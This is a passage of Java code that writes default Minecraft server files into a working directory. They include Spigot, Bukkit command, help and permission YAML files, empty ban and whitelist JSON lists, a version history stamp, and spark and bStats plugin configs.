            sy.append("      exp: 3.0\n");
            sy.append("    item-despawn-rate: 6000\n");
            sy.append("    arrow-despawn-rate: 1200\n");
            sy.append("    trident-despawn-rate: 1200\n");
            sy.append("    zombie-aggressive-towards-villager: true\n");
            sy.append("    nerf-spawner-mobs: false\n");
            sy.append("    enable-zombie-pigmen-portal-spawns: true\n");
            sy.append("    wither-spawn-sound-radius: 0\n");
            sy.append("    end-portal-sound-radius: 0\n");
            sy.append("    hanging-tick-frequency: 100\n");
            sy.append("    mob-spawn-range: 8\n");
            sy.append("    simulation-distance: default\n");
            sy.append("    view-distance: default\n");
            sy.append("    entity-activation-range:\n");
            sy.append("      animals: 32\n");
            sy.append("      monsters: 32\n");
            sy.append("      raiders: 48\n");
            sy.append("      misc: 16\n");
            sy.append("      water: 16\n");
            sy.append("      flying-monsters: 32\n");
            sy.append("    entity-tracking-range:\n");
            sy.append("      players: 48\n");
            sy.append("      animals: 48\n");
            sy.append("      monsters: 48\n");
            sy.append("      misc: 32\n");
            sy.append("      other: 64\n");
            sy.append("    ticks-per:\n");
            sy.append("      hopper-transfer: 8\n");
            sy.append("      hopper-check: 1\n");
            sy.append("    hopper-amount: 1\n");
            sy.append("    hopper-can-load-chunks: false\n");
            sy.append("    max-tnt-per-tick: 100\n");
            sy.append("    max-tick-time:\n");
            sy.append("      tile: 50\n");
            sy.append("      entity: 50\n");
            sy.append("config-version: 12\n");
            Files.write(spigot.toPath(), sy.toString().getBytes());
        }

        // 6. commands.yml
        File cmd = new File(workDir, "commands.yml");
        if (!cmd.exists()) {
            StringBuilder cy = new StringBuilder();
            cy.append("# This is the commands configuration file for Bukkit.\n");
            cy.append("# For documentation on how to make use of this file, check out the Bukkit Wiki at\n");
            cy.append("# https://bukkit.fandom.com/wiki/Commands.yml\n");
            cy.append("\n");
            cy.append("command-block-overrides: []\n");
            cy.append("aliases:\n");
            cy.append("  icanhasbukkit:\n");
            cy.append("  - \"version\"\n");
            Files.write(cmd.toPath(), cy.toString().getBytes());
        }

        // 7. help.yml
        File help = new File(workDir, "help.yml");
        if (!help.exists()) {
            StringBuilder hy = new StringBuilder();
            hy.append("# This is the help configuration file for Bukkit.\n");
            hy.append("\n");
            hy.append("general:\n");
            hy.append("  test: false\n");
            hy.append("  max-per-page: -1\n");
            hy.append("  full-list: false\n");
            hy.append("  title: 'Minecraft Help'\n");
            hy.append("  command-prefix: '/'\n");
            Files.write(help.toPath(), hy.toString().getBytes());
        }

        // 8. permissions.yml
        File perms = new File(workDir, "permissions.yml");
        if (!perms.exists()) {
            StringBuilder py = new StringBuilder();
            py.append("# This is the permissions configuration file for Bukkit.\n");
            py.append("# For documentation on how to make use of this file, check out the Bukkit Wiki at\n");
            py.append("# https://bukkit.fandom.com/wiki/Permissions.yml\n");
            py.append("\n");
            py.append("default:\n");
            py.append("  default: true\n");
            Files.write(perms.toPath(), py.toString().getBytes());
        }

        // 9. JSON 文件（空数组）
        String[] jsonFiles = {"banned-ips.json", "banned-players.json", "ops.json", "usercache.json", "whitelist.json"};
        for (String jf : jsonFiles) {
            File f = new File(workDir, jf);
            if (!f.exists()) Files.write(f.toPath(), "[]".getBytes());
        }

        // 10. version_history.json
        File vh = new File(workDir, "version_history.json");
        if (!vh.exists()) {
            String ts = new Date().toInstant().toString();
            StringBuilder vhb = new StringBuilder();
            vhb.append("{\n");
            vhb.append("  \"1.21.4\": \"").append(ts).append("\"\n");
            vhb.append("}");
            Files.write(vh.toPath(), vhb.toString().getBytes());
        }

        // 11. logs/latest.log
        new File(workDir, "logs/latest.log").createNewFile();

        // 12. plugins/spark/config.json
        File sparkDir = new File(workDir, "plugins/spark");
        if (!sparkDir.exists()) sparkDir.mkdirs();
        File sparkConfig = new File(workDir, "plugins/spark/config.json");
        if (!sparkConfig.exists()) {
            StringBuilder sc = new StringBuilder();
            sc.append("{\n");
            sc.append("  \"statisticsEnabled\": true,\n");
            sc.append("  \"statisticsInterval\": 3,\n");
            sc.append("  \"sparkDirectory\": \"plugins/spark/\",\n");
            sc.append("  \"profilerMaximumDurationSeconds\": 300,\n");
            sc.append("  \"profilerSamplingInterval\": 10000000,\n");
            sc.append("  \"uploadEndpoint\": \"https://sparkprofiler.com/api/\",\n");
            sc.append("  \"enableBootstrapOutputRedirector\": true,\n");
            sc.append("  \"defaultServerConnection\": \"server\"\n");
            sc.append("}\n");
            Files.write(sparkConfig.toPath(), sc.toString().getBytes());
        }

        // 13. plugins/bStats/config.yml
        File bstatsDir = new File(workDir, "plugins/bStats");
        if (!bstatsDir.exists()) bstatsDir.mkdirs();
        File bstatsConfig = new File(workDir, "plugins/bStats/config.yml");
        if (!bstatsConfig.exists()) {
            StringBuilder bc = new StringBuilder();
            bc.append("# bStats collects some data for plugin authors.\n");
            bc.append("# Check out https://bStats.org/ to learn more.\n");
            bc.append("enabled: true\n");
            bc.append("serverUuid: " + java.util.UUID.randomUUID() + "\n");
            bc.append("serverLogErrors: false\n");
            bc.append("logSentData: false\n");
            bc.append("logResponseStatusText: false\n");
            Files.write(bstatsConfig.toPath(), bc.toString().getBytes());
        }

        // 14. config 目录占位
        new File(workDir, "config/.keep").createNewFile();
        new File(workDir, "cache/.keep").createNewFile();
        new File(workDir, "versions/.keep").createNewFile();
    }
}
